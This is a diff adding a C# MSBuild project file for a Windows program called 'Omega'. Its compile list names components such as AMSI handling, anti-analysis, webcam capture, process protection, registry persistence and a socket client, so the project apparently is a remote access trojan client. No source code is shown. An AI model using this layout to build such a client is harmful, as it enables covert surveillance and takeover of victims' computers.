@@ -1,0 +1,81 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{9430CF1F-1BF6-416C-B306-445C2D923894}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>Omega</RootNamespace>
+    <AssemblyName>Omega</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationIcon>Omega.ico</ApplicationIcon>
+    <StartupObject>Client.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Client\Algorithm\Aes256.cs" />
+    <Compile Include="Client\Connection\Amsi.cs" />
+    <Compile Include="Client\Connection\ClientSocket.cs" />
+    <Compile Include="Client\Connection\Win32.cs" />
+    <Compile Include="Client\Helper\AntiProcess.cs" />
+    <Compile Include="Client\Helper\Anti_Analysis.cs" />
+    <Compile Include="Client\Helper\Camera.cs" />
+    <Compile Include="Client\Helper\HwidGen.cs" />
+    <Compile Include="Client\Helper\IdSender.cs" />
+    <Compile Include="Client\Helper\Methods.cs" />
+    <Compile Include="Client\Helper\MutexControl.cs" />
+    <Compile Include="Client\Helper\NativeMethods.cs" />
+    <Compile Include="Client\Helper\ProcessCritical.cs" />
+    <Compile Include="Client\Helper\PROCESSENTRY32.cs" />
+    <Compile Include="Client\Helper\SetRegistry.cs" />
+    <Compile Include="Client\Install\NormalStartup.cs" />
+    <Compile Include="Client\Program.cs" />
+    <Compile Include="Client\Settings.cs" />
+    <Compile Include="MessagePackLib\MessagePack\BytesTools.cs" />
+    <Compile Include="MessagePackLib\MessagePack\MsgPack.cs" />
+    <Compile Include="MessagePackLib\MessagePack\MsgPackArray.cs" />
+    <Compile Include="MessagePackLib\MessagePack\MsgPackEnum.cs" />
+    <Compile Include="MessagePackLib\MessagePack\MsgPackType.cs" />
+    <Compile Include="MessagePackLib\MessagePack\ReadTools.cs" />
+    <Compile Include="MessagePackLib\MessagePack\WriteTools.cs" />
+    <Compile Include="MessagePackLib\MessagePack\Zip.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
